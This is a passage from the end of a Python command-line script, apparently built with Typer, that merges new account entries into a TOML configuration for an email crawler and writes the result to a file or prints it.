            base = tomllib.load(f)
    else:
        base = {"crawler": {"days": 0, "output_dir": "eml_exports", "log_file": "email_crawler.log"}, "accounts": {}}

    base.setdefault("accounts", {}).update(new_accounts)

    if output:
        out_path = Path(output)
        out_path.write_bytes(tomli_w.dumps(base).encode())
        typer.echo(f"✅ Config written to: {out_path}")
    else:
        typer.echo(tomli_w.dumps(base))


if __name__ == "__main__":
    app()
